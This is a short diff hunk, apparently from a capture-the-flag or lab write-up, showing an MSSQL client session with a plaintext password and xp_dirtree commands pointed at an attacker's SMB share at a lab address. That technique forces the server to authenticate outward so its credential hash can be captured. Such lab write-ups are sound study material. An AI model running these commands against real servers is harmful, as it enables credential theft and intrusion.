@@ -26,7 +26,6 @@ password: MSSQLAccess01!
 [!] Press help for extra shell commands
 SQL> EXEC master..xp_dirtree '\\10.10.14.153\share'
 subdirectory                                                                                                                                                                                                                                                            depth
-
 ---
 
 SQL>EXEC master..xp_dirtree '\\$localhost\share'
